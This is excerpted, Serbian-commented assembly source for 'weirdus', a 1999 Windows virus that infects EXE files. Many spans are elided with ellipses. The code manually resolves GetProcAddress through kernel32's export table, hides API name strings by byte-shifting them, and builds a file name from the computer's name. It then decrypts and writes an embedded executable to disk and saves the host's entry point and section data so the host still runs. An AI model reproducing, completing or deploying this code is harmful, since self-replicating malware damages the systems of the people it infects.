...
;* HISTORY *
; ver 0.21 (18-may-1999): još smanjenja (cmpname)
...
;**	  weirdus
;**	  -------
;** + Ovde se nalazi kod virusa koji se kači na EXE fajlove
;** + Ceo je u DATA segmentu jer nam je lakše da mu pristupamo iz Watcoma.
;**	  Moglo je da bude i u CODE segmentu - tada bi morali da koristimo
;**	  program PEWRSEC, ali dobija se isto
;** + Obrati pažnju: program ne sme da bude vezan direktno za bilo šta -
;**	  sve mora da se radi preko ofseta
;** + Zbog baga asemblera? ne može da radi `mov eax, [ebp + ofs1 - ofs2]` (16 bitno?)
;**	  Zato moramo da koristimo apsolutnu dodelu.
;** + Trenutna veličina: 999 bajta
...
_virus_start:
		push eax				; sačuvaj mesto za povratnu adresu (ka hostu)
		pushad
		call letsgo
...
x = _ddGetModuleHandleA - _data_start
		...
		test eax, eax
		jz virus_exit			; ako je nastala greška, skoči
...
x = _ddGetProcAddress - _data_start
		...
		jnz @f					; da, sve je u redu, idi dalje
								; ne, ajd sad da probamo sami da nađemo

; Sam nađi adresu GetProcAddress ako možeš
x = strGetProcAddress - _data_start
		...
		test eax, eax			; da li je f-ja nađena?
		jz virus_exit			; nije, skoči
...
; lepo je što ComputerName sadrži samo za fajlove validne karaktere!
x = cmpname - _data_start
...
temp1:	mov ch, cl
		sub ch, 'a'
		cmp ch, 25
		ja nextchar				; ako nije slovo onda ga upiši
...
; dodaj još extenziju '.exe'
		mov dword ptr [eax], 6578652Eh
		mov byte ptr [eax+4], 0 ; zatvori string


;*******************************************************************
;*** Kreiraj fajl ako ga nema, zapiši u njega virus i zatvori ga ***
;*******************************************************************
...
x = filename - _data_start
		...
		je virus_start			; došlo je do greške ili virus već postoji!

		mov edx, eax			; nema greške, zapamti handle fajla
		push eax				; i stavi na stek pošto treba kasnije za CloseHandle

; dekriptuj i upiši fajl
		xor ecx, ecx
...
;**************************************
;*** Izađi iz virusa i startuj host ***
;**************************************
virus_exit:
		popad
...
;*** WinGetProcAddress ***
;*************************
; u slučaju da GetProcAddress nije uvezena, koristi se ova f-ja
; za dobavljanje adrese te f-je. Može da služi i za dobavljanje
; svih ostalih adresa, ali bolje da to Windows radi.
; Znači, ova f-ja je malo modifikovana tako da ide u prilog tome
...
; Brza provera ispravnosti - ovde nam ne treba pošto sigurno
; tražimo f-ju iz validnog handlea kernel32.dll!
		sub eax, eax
;		cmp word ptr [edx], 'ZM'
;		jnz @@gpaExit
		mov edx, [edx+60]
...
; handle je validan - brza provera je prošla OK
		mov edx, [edx+78h]
		add edx, [esp+16]

; EDX sada pokazuje na početak .edata
...
; Prođi kroz sve stringove dok ne nađeš isti ili do kraja
		mov edi, [edx+32]
		add edi, [esp+16]
...
; nije nađen string, vrati grešku
		sub eax, eax
		jmp short @@gpaExit

@@gpaOrdinalFound:
; najzad je nađeno ono što se traži: (numNames - ECX) je ordinal
; funkcije čiju adresu tražimo
		mov eax, [edx+24]
		sub eax, ecx
		mov ecx, [edx+24h]
		add ecx, [esp+16]
...
; da bi se prostor iskoristio što bolje, stringovi su preklopljeni
; sa drugim podacima, pošto se stringovi koriste samo na početku programa
...
_oldEPoffs				dd	?
_oldfilesize			dd	?
_oldoffs1				dd	?	; veličina poslednje sekcija (SizeOfRawData)
_olddata1				dd	?
_oldoffs2				dd	?	; veličina poslednje sekcije u DirectoryData (ako postoji!)
_olddata2				dd	?
_oldoffs3				dd	?	; karakteristike poslednje sekcije
_olddata3				dd	?
_oldoffs4				dd	?	; veličina poslednje sekcije (VirtualSize)
_olddata4				dd	?
...
strGetWindowsDirectoryA db 48h, 66h, 75h, 58h, 6Ah, 6Fh
						db 65h, 70h, 78h, 74h
startup_info			db 45h, 6Ah, 73h, 66h			; počinje sa dwordom 68, a zatim ide još 16 dworda (68 bajta ukupno)
						db 64h, 75h, 70h, 73h
...
; u cilju smanjenja dužine koda ovaj redosled je obavezan!!!!
...
;*** Ovde će se smestiti ceo exe fajl ***
_addfile_size			dd ?	; ovde ide veličina fajla koji je dodat
;_virus_data					; ovde se nalazi exe fajl koga treba zapisati
								; znači: (&_addfile_size) + sizeof(dd)

_virus_end:						; Konačno... kraj virusa
_DATA ends
